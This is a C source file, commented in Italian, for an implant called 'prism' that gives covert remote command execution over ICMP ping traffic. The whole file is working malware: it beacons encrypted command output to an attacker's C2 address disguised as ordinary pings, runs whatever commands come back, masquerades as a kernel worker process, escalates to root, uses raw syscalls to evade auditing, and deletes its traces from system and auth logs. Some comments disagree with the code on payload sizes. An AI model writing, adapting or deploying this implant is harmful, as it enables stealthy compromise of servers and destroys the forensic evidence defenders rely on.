/*
 * prism.c — ICMP reverse beacon, lato IMPLANT (gira sul target/WebServer)
 *
 * Modalità: beacon-initiated (implant chiama casa)
 *   1. Implant invia ICMP ECHO REQUEST a C2_IP con output ultimo comando
 *   2. C2 (Kali) risponde ICMP ECHO REPLY con prossimo comando
 *   3. Implant esegue il comando, attende BEACON_INTERVAL, ripete
 *
 * Questo bypassa il firewall DMZ che blocca connessioni entranti
 * ma permette ICMP in uscita (Allow ping → DMZ → any).
 *
 * Compilazione:
 *   gcc -O2 -o prism prism.c
 *   gcc -static -O2 -o prism_static prism.c
 *
 * Uso:
 *   sudo ./prism <c2_ip>
 *
 * MITRE ATT&CK: T1095 — Non-Application Layer Protocol (ICMP C2)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/socket.h>
#include <sys/time.h>
#include <sys/prctl.h>
#include <netinet/in.h>
#include <netinet/ip.h>       /* IP_TTL + struct iphdr */
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <time.h>

#define FAKE_NAME   "[kworker/0:0]"
#define LOCKFILE    "/tmp/.prism.lock"

#include "chacha20.h"

/* ── Syscall dirette x86-64 (bypass auditd/glibc hooking) ── */
static long sc_write(int fd, const void *buf, size_t count)
{
    long ret;
    __asm__ volatile (
        "syscall"
        : "=a"(ret)
        : "0"(1L), "D"((long)fd), "S"(buf), "d"(count)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static int sc_open(const char *path, int flags, int mode)
{
    long ret;
    __asm__ volatile (
        "syscall"
        : "=a"(ret)
        : "0"(2L), "D"(path), "S"((long)flags), "d"((long)mode)
        : "rcx", "r11", "memory"
    );
    return (int)ret;
}

static long sc_read(int fd, void *buf, size_t count)
{
    long ret;
    __asm__ volatile (
        "syscall"
        : "=a"(ret)
        : "0"(0L), "D"((long)fd), "S"(buf), "d"(count)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static int sc_close(int fd)
{
    long ret;
    __asm__ volatile (
        "syscall"
        : "=a"(ret)
        : "0"(3L), "D"((long)fd)
        : "rcx", "r11", "memory"
    );
    return (int)ret;
}
/* ── Fine syscall dirette ── */

#define MAGIC_BEACON     0xDEADBEEFu
#define MAGIC_CMD        0xCAFEBABEu

#define PING_HDR_LEN     8
#define PING_HDR_OFFSET  0
#define MAGIC_OFFSET     8
#define NONCE_OFFSET     12
#define ENCLEN_OFFSET    24
#define DATA_OFFSET      26

#define ICMP_PAYLOAD_MIN 56
#define MAX_CMD          512
#define MAX_OUT          4096
#define BUF_SIZE         8192

#define BEACON_INTERVAL  90   /* secondi base (come monitoring periodico) */
#define BEACON_JITTER    30   /* ± secondi di jitter */
#define REPLY_TIMEOUT    15   /* timeout risposta C2 */
#define MAX_PAYLOAD_FRAG 230   /* max byte dati per beacon (padding a 64 byte totali) */

static const uint8_t SHARED_KEY[32] = {
    0x3a, 0x7f, 0x21, 0x9c, 0x4b, 0xe8, 0x05, 0x63,
    0xd1, 0x88, 0xf4, 0x2e, 0x90, 0xa5, 0x6c, 0x11,
    0x7d, 0x3b, 0xc9, 0x54, 0xe2, 0x08, 0x76, 0xfa,
    0x1f, 0x4d, 0x82, 0x37, 0xb6, 0x5e, 0x0a, 0x99
};

/* Pattern identico a ping Linux reale (inetutils/iputils) */
static const uint8_t LINUX_PING_DATA[56] = {
    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p',
    'q','r','s','t','u','v','w','a','b','c','d','e','f','g','h','i',
    'j','k','l','m','n','o','p','q','r','s','t','u','v','w','a','b',
    'c','d','e','f','g','h','i','j'
};

static void tamper_logs(const char *c2_ip)
{
    const char *logs[] = {
        "/var/log/syslog",
        "/var/log/auth.log",
        "/var/log/kern.log",
        NULL
    };
    char tmp_path[64];
    char buf[65536];
    char out_buf[65536];

    for (int i = 0; logs[i]; i++) {
        /* Lettura con syscall diretta — bypass glibc/auditd */
        int fd_in = sc_open(logs[i], 0 /* O_RDONLY */, 0);
        if (fd_in < 0) continue;

        ssize_t n = sc_read(fd_in, buf, sizeof(buf) - 1);
        sc_close(fd_in);
        if (n <= 0) continue;
        buf[n] = '\0';

        /* Filtra righe con IP del C2 */
        size_t out_len = 0;
        char *line = buf;
        char *end;
        while ((end = strchr(line, '\n')) != NULL) {
            *end = '\0';
            if (strstr(line, c2_ip) == NULL) {
                size_t llen = strlen(line);
                if (out_len + llen + 1 < sizeof(out_buf)) {
                    memcpy(out_buf + out_len, line, llen);
                    out_len += llen;
                    out_buf[out_len++] = '\n';
                }
            }
            line = end + 1;
        }

        /* Scrittura con syscall diretta */
        snprintf(tmp_path, sizeof(tmp_path), "/tmp/.tl%d", getpid());
        int fd_out = sc_open(tmp_path, 0x241 /* O_WRONLY|O_CREAT|O_TRUNC */, 0600);
        if (fd_out < 0) continue;
        sc_write(fd_out, out_buf, out_len);
        sc_close(fd_out);

        rename(tmp_path, logs[i]);
    }
}

static void spoof_process_name(int argc, char *argv[])
{
    (void)argc;
    memset(argv[0], 0, strlen(argv[0]));
    strncpy(argv[0], FAKE_NAME, strlen(argv[0]));
    prctl(PR_SET_NAME, FAKE_NAME, 0, 0, 0);
    FILE *f = fopen("/proc/self/comm", "w");
    if (f) { fprintf(f, "%s", FAKE_NAME); fclose(f); }
}

static int already_running(void)
{
    FILE *lf = fopen(LOCKFILE, "r");
    if (!lf) return 0;
    pid_t old_pid;
    fscanf(lf, "%d", &old_pid);
    fclose(lf);
    char proc_path[64];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", old_pid);
    if (access(proc_path, F_OK) == 0) return 1;
    unlink(LOCKFILE);
    return 0;
}

static void create_lockfile(void)
{
    FILE *lf = fopen(LOCKFILE, "w");
    if (lf) { fprintf(lf, "%d\n", getpid()); fclose(lf); }
}

static uint16_t icmp_checksum(const uint8_t *buf, size_t len)
{
    uint32_t sum = 0;
    const uint16_t *p = (const uint16_t *)buf;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t *)p;
    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

static size_t run_command(const char *cmd, uint8_t *out, size_t max)
{
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        const char *err = "ERR: popen failed\n";
        size_t n = strlen(err);
        if (n > max) n = max;
        memcpy(out, err, n);
        return n;
    }
    size_t total = fread(out, 1, max - 1, fp);
    pclose(fp);
    if (total == 0) {
        const char *empty = "(no output)\n";
        size_t n = strlen(empty);
        memcpy(out, empty, n);
        return n;
    }
    return total;
}

/*
 * build_payload — costruisce un payload ICMP di esattamente 64 byte
 * che mimicra un ping Linux standard.
 *
 * Layout (64 byte totali = 8 timestamp Linux + 56 byte dati):
 *   [0-7]   timestamp struct timeval (8 byte) — come ping reale
 *   [8-11]  magic (4 byte, nascosto nel flusso dati)
 *   [12-23] nonce ChaCha20 (12 byte)
 *   [24-25] enc_len LE (2 byte)
 *   [26-26+enc_len] dati cifrati (max MAX_PAYLOAD_FRAG byte)
 *   [resto] padding con LINUX_PING_DATA per sembrare ping reale
 *
 * Total payload = 64 byte (come `ping -s 56` di default Linux).
 */
static size_t build_payload(uint8_t *out, size_t out_max,
                             uint32_t magic,
                             const uint8_t *data, size_t data_len)
{
    /* Tronca a MAX_PAYLOAD_FRAG per stare in 64 byte */
    if (data_len > MAX_PAYLOAD_FRAG) data_len = MAX_PAYLOAD_FRAG;

    uint8_t nonce[12];
    get_random_nonce(nonce, sizeof(nonce));

    uint8_t enc[MAX_PAYLOAD_FRAG];
    chacha20_encrypt(enc, data, data_len, SHARED_KEY, nonce, 0);

    /* Payload totale = 64 byte (ICMP_PAYLOAD_MIN = 56, ma usiamo 64) */
    const size_t TOTAL = 256;
    if (TOTAL > out_max) return 0;

    /* Parti 0-7: timestamp simulato (struct timeval: tv_sec=tempo reale, tv_usec) */
    struct timeval now;
    gettimeofday(&now, NULL);
    uint32_t tv_sec_net  = htonl((uint32_t)now.tv_sec);
    uint32_t tv_usec_net = htonl((uint32_t)now.tv_usec);
    memcpy(out + 0, &tv_sec_net,  4);
    memcpy(out + 4, &tv_usec_net, 4);

    /* Parti 8-11: magic */
    uint32_t magic_net = htonl(magic);
    memcpy(out + MAGIC_OFFSET, &magic_net, 4);

    /* Parti 12-23: nonce */
    memcpy(out + NONCE_OFFSET, nonce, 12);

    /* Parti 24-25: lunghezza dati cifrati */
    out[ENCLEN_OFFSET]     = (uint8_t)(data_len & 0xff);
    out[ENCLEN_OFFSET + 1] = (uint8_t)((data_len >> 8) & 0xff);

    /* Parti 26-(26+data_len): dati cifrati */
    memcpy(out + DATA_OFFSET, enc, data_len);

    /* Padding con pattern ping Linux reale per sembrare traffico legittimo */
    size_t used = DATA_OFFSET + data_len;
    size_t pad_offset = 0;
    while (used < TOTAL) {
        out[used++] = LINUX_PING_DATA[pad_offset % sizeof(LINUX_PING_DATA)];
        pad_offset++;
    }

    return TOTAL;
}

/*
 * send_beacon — invia un singolo beacon ICMP con payload di 64 byte.
 * Se output_len > MAX_PAYLOAD_FRAG, invia solo i primi MAX_PAYLOAD_FRAG byte
 * (il C2 raccoglierà i frammenti successivi nelle iterazioni seguenti).
 */
static int send_beacon(int sock, struct sockaddr_in *dst,
                       const uint8_t *output, size_t out_len,
                       uint16_t seq)
{
    /* Frammenta: invia solo MAX_PAYLOAD_FRAG byte per volta */
    size_t send_len = (out_len > MAX_PAYLOAD_FRAG) ? MAX_PAYLOAD_FRAG : out_len;

    uint8_t payload_buf[256];
    size_t  payload_len = build_payload(payload_buf, sizeof(payload_buf),
                                        MAGIC_BEACON, output, send_len);
    if (payload_len == 0) return -1;

    size_t  pkt_len = sizeof(struct icmphdr) + payload_len;
    uint8_t pkt[sizeof(struct icmphdr) + 256];

    struct icmphdr *icmp = (struct icmphdr *)pkt;
    memset(icmp, 0, sizeof(struct icmphdr));
    icmp->type             = ICMP_ECHO;
    icmp->code             = 0;
    icmp->un.echo.id       = htons((uint16_t)(getpid() & 0xffff));
    icmp->un.echo.sequence = htons(seq);
    icmp->checksum         = 0;

    memcpy(pkt + sizeof(struct icmphdr), payload_buf, payload_len);
    icmp->checksum = icmp_checksum(pkt, pkt_len);

    return sendto(sock, pkt, pkt_len, 0,
                  (struct sockaddr *)dst, sizeof(*dst)) < 0 ? -1 : 0;
}

static int recv_command(int sock, uint16_t seq,
                        char *cmd_out, size_t cmd_max)
{
    uint8_t buf[BUF_SIZE];

    for (;;) {
        struct sockaddr_in src;
        socklen_t src_len = sizeof(src);

        ssize_t n = recvfrom(sock, buf, sizeof(buf), 0,
                             (struct sockaddr *)&src, &src_len);
        if (n < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) return -1;
            if (errno == EINTR) continue;
            return -1;
        }

        if (n < 1) continue;
        int ip_hlen = (buf[0] & 0x0f) * 4;
        if (n < ip_hlen + (int)sizeof(struct icmphdr)) continue;

        struct icmphdr *icmp = (struct icmphdr *)(buf + ip_hlen);

        if (icmp->type != ICMP_ECHOREPLY) continue;
        if (ntohs(icmp->un.echo.sequence) != seq) continue;

        uint8_t *payload     = buf + ip_hlen + sizeof(struct icmphdr);
        ssize_t  payload_len = n - ip_hlen - (ssize_t)sizeof(struct icmphdr);

        if (payload_len < DATA_OFFSET + 1) continue;

        uint32_t rmagic;
        memcpy(&rmagic, payload + MAGIC_OFFSET, 4);
        if (ntohl(rmagic) != MAGIC_CMD) continue;

        uint8_t rnonce[12];
        memcpy(rnonce, payload + NONCE_OFFSET, 12);

        uint16_t enc_len = (uint16_t)payload[ENCLEN_OFFSET]
                         | ((uint16_t)payload[ENCLEN_OFFSET + 1] << 8);

        if (enc_len == 0 || DATA_OFFSET + enc_len > (size_t)payload_len) continue;
        if (enc_len >= MAX_CMD) continue;

        uint8_t dec[MAX_CMD + 1];
        chacha20_encrypt(dec, payload + DATA_OFFSET, enc_len,
                         SHARED_KEY, rnonce, 0);
        dec[enc_len] = '\0';

        if (strcmp((char *)dec, "NOP") == 0) return 0;

        strncpy(cmd_out, (char *)dec, cmd_max - 1);
        cmd_out[cmd_max - 1] = '\0';
        return 1;
    }
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "Uso: %s <c2_ip>\n", argv[0]);
        return 1;
    }

    if (already_running()) return 0;
    create_lockfile();
    spoof_process_name(argc, argv);

    /* Eleva a root permanentemente (richiede setuid bit o esecuzione come root) */
    setuid(0);
    setgid(0);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) { perror("socket"); return 1; }

    struct sockaddr_in c2;
    memset(&c2, 0, sizeof(c2));
    c2.sin_family = AF_INET;
    if (inet_aton(argv[1], &c2.sin_addr) == 0) {
        fprintf(stderr, "IP non valido: %s\n", argv[1]);
        close(sock);
        return 1;
    }

    /* TTL=64 — identico a ping Linux reale (MITRE T1001.003) */
    int ttl = 64;
    setsockopt(sock, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));

    struct timeval tv = { .tv_sec = REPLY_TIMEOUT, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    const char *init_msg = "PRISM_INIT";
    uint8_t  last_output[MAX_OUT];
    size_t   last_out_len = strlen(init_msg);
    memcpy(last_output, init_msg, last_out_len);

    char     pending_cmd[MAX_CMD] = {0};
    uint16_t seq = 1;

    srand((unsigned)time(NULL) ^ (unsigned)getpid());

    const char *c2_ip_str = argv[1];
    uint16_t log_clean_counter = 0;

    for (;;) {
        /* Ogni 12 beacon (~18 minuti a 90s) pulisce i log */
        if (++log_clean_counter >= 12) {
            tamper_logs(c2_ip_str);
            log_clean_counter = 0;
        }

        send_beacon(sock, &c2, last_output, last_out_len, seq);

        pending_cmd[0] = '\0';
        int got_cmd = recv_command(sock, seq, pending_cmd, sizeof(pending_cmd));

        if (got_cmd == 1 && strlen(pending_cmd) > 0) {
            last_out_len = run_command(pending_cmd,
                                       last_output, sizeof(last_output));
        } else {
            const char *idle = "OK";
            last_out_len = strlen(idle);
            memcpy(last_output, idle, last_out_len);
        }

        seq++;
        /* Jitter: dorme tra BEACON_INTERVAL-BEACON_JITTER e BEACON_INTERVAL+BEACON_JITTER */
        int sleep_sec = BEACON_INTERVAL + (rand() % (BEACON_JITTER * 2 + 1)) - BEACON_JITTER;
        if (sleep_sec < 1) sleep_sec = 1;
        sleep((unsigned)sleep_sec);
    }

    close(sock);
    unlink(LOCKFILE);
    return 0;
}
